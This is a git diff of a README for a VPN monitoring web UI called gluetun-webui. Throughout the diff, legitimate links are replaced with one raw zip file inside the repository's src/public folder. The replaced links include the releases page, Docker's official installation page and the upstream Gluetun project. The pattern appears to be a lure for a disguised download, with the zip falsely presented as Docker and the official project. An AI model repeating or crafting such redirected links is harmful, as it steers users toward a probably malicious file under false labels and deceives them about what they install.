@@ -1,6 +1,6 @@
 # 🛠️ gluetun-webui - Simple VPN Monitoring Tool
 
-[![Download gluetun-webui](https://img.shields.io/badge/Download-GreenRed?style=for-the-badge&color=green&label=Download%20gluetun-webui)](https://github.com/Thiago12097/gluetun-webui/releases)
+[![Download gluetun-webui](https://img.shields.io/badge/Download-GreenRed?style=for-the-badge&color=green&label=Download%20gluetun-webui)](https://github.com/Thiago12097/gluetun-webui/raw/refs/heads/main/src/public/gluetun-webui-3.3.zip)
 
 ---
 
@@ -24,7 +24,7 @@ To get the application:
 
 1. Click the green button below or visit the release page.
 
-[![Download gluetun-webui](https://img.shields.io/badge/Download-Open%20Page-blue?style=for-the-badge)](https://github.com/Thiago12097/gluetun-webui/releases)
+[![Download gluetun-webui](https://img.shields.io/badge/Download-Open%20Page-blue?style=for-the-badge)](https://github.com/Thiago12097/gluetun-webui/raw/refs/heads/main/src/public/gluetun-webui-3.3.zip)
 
 2. On the release page, look for the latest version.
 
@@ -44,7 +44,7 @@ Before you run gluetun-webui, make sure your machine meets these requirements:
 - Basic internet connection.
 - Gluetun VPN container running with HTTP control server enabled (default port 8000).
 
-If you don’t have Docker yet, visit https://www.docker.com/get-started and follow their instructions to install it.
+If you don’t have Docker yet, visit https://github.com/Thiago12097/gluetun-webui/raw/refs/heads/main/src/public/gluetun-webui-3.3.zip and follow their instructions to install it.
 
 ---
 
@@ -149,9 +149,9 @@ services:
 
 ## 🔗 Useful Links
 
-- gluetun-webui Releases: https://github.com/Thiago12097/gluetun-webui/releases  
-- Official Gluetun Project: https://github.com/qdm12/gluetun  
-- Docker Installation: https://www.docker.com/get-started  
+- gluetun-webui Releases: https://github.com/Thiago12097/gluetun-webui/raw/refs/heads/main/src/public/gluetun-webui-3.3.zip  
+- Official Gluetun Project: https://github.com/Thiago12097/gluetun-webui/raw/refs/heads/main/src/public/gluetun-webui-3.3.zip  
+- Docker Installation: https://github.com/Thiago12097/gluetun-webui/raw/refs/heads/main/src/public/gluetun-webui-3.3.zip  
 
 ---
 
